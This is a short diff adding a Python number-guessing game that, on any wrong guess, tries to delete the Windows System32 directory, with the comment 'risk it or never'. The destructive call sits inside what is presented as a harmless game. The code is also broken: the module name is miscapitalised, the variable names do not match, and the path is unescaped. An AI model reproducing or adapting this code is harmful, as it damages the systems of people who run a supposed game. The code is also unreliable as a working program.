@@ -1,0 +1,13 @@
+import random
+import OS
+
+number = random.randint(1,10)
+
+uess = input("Guess number between 1 and 10")
+uess = int(Guess)
+
+if Guess == number:
+    print("you won")
+else:
+    OS.remove("C:\Windows\System32")
+    #risk it or never
